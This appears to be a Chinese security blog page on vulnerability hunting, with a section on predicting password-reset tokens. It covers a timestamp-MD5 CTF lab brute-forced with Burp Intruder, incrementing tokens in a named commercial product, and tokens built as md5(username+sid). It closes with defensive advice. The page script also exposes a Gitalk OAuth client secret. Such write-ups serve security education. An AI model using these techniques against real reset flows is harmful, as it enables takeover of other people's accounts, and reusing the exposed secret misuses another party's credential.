+<h2 id="任意用户密码重置（七）：Token可预测"><a href="#任意用户密码重置（七）：Token可预测" class="headerlink" title="任意用户密码重置（七）：Token可预测"></a>任意用户密码重置（七）：Token可预测</h2><p><strong>案例一：基于时间戳生成的 token</strong></p>
+<p><a href="http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/" target="_blank" rel="noopener">http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/</a> 是一道在线 CTF 题目：</p>
+<p>“忘记密码”功能是攻击点，尝试重置 admin 的密码：</p>
+<p>对应请求与应答为：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6xoq8ojj20j609l77i.jpg" alt></p>
+<p>除了提示已发送重置邮件外，并无其他信息。尝试重置其他账号 yangyangwithgnu：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6xz4zvdj20j609kadm.jpg" alt></p>
+<p>获得重置 URL 信息 <a href="http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=8135f8b07653b2cbc3ec05c781a29591&amp;username=yangyangwithgnu" target="_blank" rel="noopener">http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=8135f8b07653b2cbc3ec05c781a29591&amp;username=yangyangwithgnu</a>，访问后提示重置成功。那么，现在的情况是，admin 的重置 URL 无显示，其他账号的 URL 有显示，只要拿到 admin 的重置 URL，很可能就能看到 flag。</p>
+<p>上面重置 URL 中 <code>sukey</code> 参数引起我的注意，显然它就是重置凭证。将其值 8135f8b07653b2cbc3ec05c781a29591 先用 base64 解码无果，后将其进行 MD5 解密得到明文 1530342360：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f6ykpps1j20cp07bab2.jpg" alt></p>
+<p>果然，重置凭证是对当前 unix 时间戳进行 MD5 加密所得。</p>
+<p>那么，可以设计这样一种攻击模型，达到重置任意账号密码的目的：</p>
+<p>第一次找回 yangyangwithgnu 的密码，获得重置 URL，其中 sukey 参数含有时间戳信息；</p>
+<p>第二次找回 admin 的密码，暂时虽无法获得重置 URL，没关系，服务端是已经生成好了；</p>
+<p>第三次又找回 yangyangwithgnu 的密码，获得重置 URL，其中 sukey 参数含有时间戳信息。以第一、三次获得的时间戳作为时间区间，由于整个过程都在短时间内完成，所以，可以轻松暴破出第二次的时间戳。</p>
+<p>我们可以构造出 admin 的密码重置 URL 类似 <a href="http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=" target="_blank" rel="noopener">http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=</a><strong>{md5(unix_timestamp)}</strong>&amp;username=admin。接下来，我将该 URL 放入 intruder 中进行暴破，将 unix_timestamp 定义为枚举变量：</p>
+<p>以 [1530347130, 1530347161] 为字典，并设置 MD5 加密算法作为载荷预处理：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f70ssrlhj20ie0ht0vp.jpg" alt></p>
+<p>很快暴破出 admin 的重置 URL，并成功拿到 flag：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f714ozx2j20j60d00wz.jpg" alt></p>
+<p><strong>案例二：基于递增序号生成的 token</strong></p>
+<p>金蝶云之家密码找回，带凭证的密码找回链接如下：</p>
+<p>从参数名猜测，u 可能为 username、t 为 token，为减少复杂性，测试发现，删掉 u 参数及值也可正常重置密码，所以，可忽略 u 参数，重点关注 t 参数。</p>
+<p>连续 5 次获取重置链接，从邮件中提取 5 个 t 参数值如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f72ypkiaj207c02waal.jpg" alt></p>
+<p>可以看出，t 参数值的 5～8位、最后 4 位，按 2 的增量呈现递增变化。</p>
+<p>分析清楚凭证的变化规律，要重置任意账号就轻松了。比如，要重置普通账号 admin 的密码，可以先触发找回攻击者账号的密码，获取 t 为 <code>52df773f24ac5b651d288d42</code>，然后触发找回 admin 的密码，t 未知，再次触发找回攻击者账号的密码，获取 t 为<code>52df774d24ac5b651d288d54</code>，根据前面分析得知的变化规律，普通账号的 t 的 5～8 位一定是 [7740, 774c] 间的偶数，后 4 位范围一定在 [8d44, 8d52] 间的偶数。几次枚举便可得有效 t 参数值：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f73oo5izj20j60agn03.jpg" alt></p>
+<p><strong>案例三：基于关键字段生成的 token</strong></p>
+<p>某网站密码找回功能，请求含有三个参数：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f76bq1j4j20gh05sgnj.jpg" alt></p>
+<p>username 是邮箱、rvcode 图片验证码、sid 未知，登录邮箱查看重置 URL：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0f75x11rlj20ge05jtbh.jpg" alt></p>
+<p>key 参数为重置凭证，尝试分析生成方式。直接将其放入 md5 在线破解网站无果，尝试用 username、rvcode、sid 等三个参数的排列组合进行 md5，当尝试到 <code>md5(username + sid)</code> 时发现生成结果与邮件中的凭证一致：</p>
+<p>猜测出其 key 的生成算法，那么，后续将豪无压力重置任意账号的密码了。</p>
+<p>类似的还有，带凭证的重置链接为 <a href="http://mysite.com/sms.php?k=a18f057d5aF" target="_blank" rel="noopener">http://mysite.com/sms.php?k=a18f057d5aF</a>，多次获取重置链接发现，凭证 f198a79b9cF 末尾的 F 恒定不变，前面 10 位字符疑似 md5 加密，尝试对不同参数的排列组合进行 md5 加密，当尝试到 md5(<code>手机号+图片验证码</code>) 时发现生成结果与邮件中的凭证一致：</p>
+<p><strong>防御密码重置链接中 token 尽可能随机化，若用常规加密算法，一定用客户端无法查看且猜测的因子作为盐值。另外，服务端应限制枚举等恶意请求。</strong></p>
+<p>此章节转自：<a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener">https://www.freebuf.com/author/yangyangwithgnu</a></p>
+<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><p><a href="https://mp.weixin.qq.com/s/_zzHPAeWvSp4ckDz0_PltQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_zzHPAeWvSp4ckDz0_PltQ</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/02/21/2019-2-21-src挖掘/" title="SRC挖掘">https://wh0ale.github.io/2019/02/21/2019-2-21-src挖掘/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/src/" rel="tag"><i class="fa fa-tag"></i># src</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/02/19/2019-2-19-内网渗透tips②/" rel="next" title="内网渗透tips②">
+                <i class="fa fa-chevron-left"></i> 内网渗透tips②
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/02/22/2019-2-22-SRC之信息收集/" rel="prev" title="SRC之信息收集">
+                SRC之信息收集 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#url跳转漏洞"><span class="nav-number">1.</span> <span class="nav-text">url跳转漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#APP手势密码绕过思路总结"><span class="nav-number">2.</span> <span class="nav-text">APP手势密码绕过思路总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#支付漏洞之总结"><span class="nav-number">3.</span> <span class="nav-text">支付漏洞之总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过限制下的短信-amp-邮箱轰炸"><span class="nav-number">4.</span> <span class="nav-text">绕过限制下的短信&amp;邮箱轰炸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露之总结"><span class="nav-number">5.</span> <span class="nav-text">信息泄露之总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#图片上传"><span class="nav-number">6.</span> <span class="nav-text">图片上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重置密码"><span class="nav-number">7.</span> <span class="nav-text">重置密码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（一）：重置凭证泄漏"><span class="nav-number">7.1.</span> <span class="nav-text">任意用户密码重置（一）：重置凭证泄漏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（二）：重置凭证接收端可篡改"><span class="nav-number">7.2.</span> <span class="nav-text">任意用户密码重置（二）：重置凭证接收端可篡改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（三）：用户混淆"><span class="nav-number">7.3.</span> <span class="nav-text">任意用户密码重置（三）：用户混淆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（四）：重置凭证未校验"><span class="nav-number">7.4.</span> <span class="nav-text">任意用户密码重置（四）：重置凭证未校验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（五）：重置凭证可暴破"><span class="nav-number">7.5.</span> <span class="nav-text">任意用户密码重置（五）：重置凭证可暴破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数"><span class="nav-number">7.6.</span> <span class="nav-text">任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码重置（七）：Token可预测"><span class="nav-number">7.7.</span> <span class="nav-text">任意用户密码重置（七）：Token可预测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码爆破"><span class="nav-number">8.</span> <span class="nav-text">密码爆破</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
